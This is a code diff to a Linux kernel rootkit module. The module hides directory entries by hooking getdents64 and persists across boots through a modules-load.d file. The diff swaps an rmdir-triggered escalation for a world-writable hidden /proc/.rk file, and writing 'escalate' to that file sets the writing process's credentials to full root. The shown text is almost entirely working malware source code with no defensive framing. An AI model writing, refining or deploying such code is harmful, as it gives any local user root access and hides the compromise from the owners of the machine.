@@ -15,7 +15,6 @@
 #include <linux/umh.h>
 
 #define HIDDEN_PROC ".rk"
-#define TRIGGER_PATH "/tmp/.rk-escalate"
 #define PERSIST_PATH "/etc/modules-load.d/hello.conf"
 
 static struct proc_dir_entry *proc_entry;
@@ -56,12 +55,12 @@ static int ret_getdents64(struct kretprobe_instance *ri,
 	if (ret <= 0)
 		return 0;
 
-	buf = kvmalloc(ret, GFP_KERNEL);
+	buf = kmalloc(ret, GFP_ATOMIC);
 	if (!buf)
 		return 0;
 
-	if (copy_from_user(buf, ctx->dirent, ret)) {
-		kvfree(buf);
+	if (copy_from_user_nofault(buf, ctx->dirent, ret)) {
+		kfree(buf);
 		return 0;
 	}
 
@@ -80,10 +79,10 @@ static int ret_getdents64(struct kretprobe_instance *ri,
 		off += cur->d_reclen;
 	}
 
-	if (copy_to_user(ctx->dirent, buf, ret))
+	if (copy_to_user_nofault(ctx->dirent, buf, ret))
 		ret = -EFAULT;
 	regs_set_return_value(regs, ret);
-	kvfree(buf);
+	kfree(buf);
 	return 0;
 }
 
@@ -95,45 +94,55 @@ static struct kretprobe gd_krp = {
 	.maxactive	= 20,
 };
 
-// --- rmdir kprobe: escalation trigger ---
-
-static int pre_rmdir(struct kprobe *p, struct pt_regs *regs)
-{
-	struct pt_regs *uregs = (struct pt_regs *)regs->di;
-	const char __user *upath = (const char __user *)uregs->di;
-	char kpath[64];
-	struct cred *cred;
-
-	if (strncpy_from_user(kpath, upath, sizeof(kpath)) <= 0)
-		return 0;
-
-	if (strcmp(kpath, TRIGGER_PATH) != 0)
-		return 0;
-
-	cred = prepare_creds();
-	if (cred) {
-		cred->uid.val = 0;
-		cred->gid.val = 0;
-		cred->euid.val = 0;
-		cred->egid.val = 0;
-		commit_creds(cred);
-	}
-	return 0;
-}
-
-static struct kprobe rmdir_kp = {
-	.symbol_name = "__x64_sys_rmdir",
-	.pre_handler = pre_rmdir,
-};
-
 // --- proc interface (hidden, accessible by direct path) ---
 
 static int status_read(struct seq_file *m, void *v)
 {
-	seq_printf(m, "hidden=yes\npersistence=%s\nescalation=rmdir %s\n",
-		   PERSIST_PATH, TRIGGER_PATH);
+	seq_printf(m, "hidden=yes\npersistence=%s\nescalation=write escalate\n",
+		   PERSIST_PATH);
 	return 0;
 }
+
+static int status_open(struct inode *inode, struct file *file)
+{
+	return single_open(file, status_read, NULL);
+}
+
+static ssize_t status_write(struct file *file, const char __user *buf,
+			    size_t count, loff_t *pos)
+{
+	char command[16];
+	size_t len = min(count, sizeof(command) - 1);
+	struct cred *cred;
+
+	if (copy_from_user_nofault(command, buf, len))
+		return -EFAULT;
+	command[len] = '\0';
+	if (strcmp(command, "escalate") != 0)
+		return -EINVAL;
+
+	cred = prepare_creds();
+	if (!cred)
+		return -ENOMEM;
+	cred->uid = GLOBAL_ROOT_UID;
+	cred->gid = GLOBAL_ROOT_GID;
+	cred->euid = GLOBAL_ROOT_UID;
+	cred->egid = GLOBAL_ROOT_GID;
+	cred->suid = GLOBAL_ROOT_UID;
+	cred->sgid = GLOBAL_ROOT_GID;
+	cred->fsuid = GLOBAL_ROOT_UID;
+	cred->fsgid = GLOBAL_ROOT_GID;
+	commit_creds(cred);
+	return count;
+}
+
+static const struct proc_ops status_ops = {
+	.proc_open = status_open,
+	.proc_read = seq_read,
+	.proc_lseek = seq_lseek,
+	.proc_release = single_release,
+	.proc_write = status_write,
+};
 
 // --- boot persistence ---
 
@@ -167,19 +176,12 @@ static int __init rootkit_init(void)
 {
 	int err;
 
-	proc_entry = proc_create_single(HIDDEN_PROC, 0444, NULL, status_read);
+	proc_entry = proc_create(HIDDEN_PROC, 0666, NULL, &status_ops);
 	if (!proc_entry)
 		return -ENOMEM;
 
 	err = register_kretprobe(&gd_krp);
 	if (err) {
-		proc_remove(proc_entry);
-		return err;
-	}
-
-	err = register_kprobe(&rmdir_kp);
-	if (err) {
-		unregister_kretprobe(&gd_krp);
 		proc_remove(proc_entry);
 		return err;
 	}
@@ -193,7 +195,6 @@ static int __init rootkit_init(void)
 
 static void __exit rootkit_exit(void)
 {
-	unregister_kprobe(&rmdir_kp);
 	unregister_kretprobe(&gd_krp);
 	proc_remove(proc_entry);
 	remove_persistence();
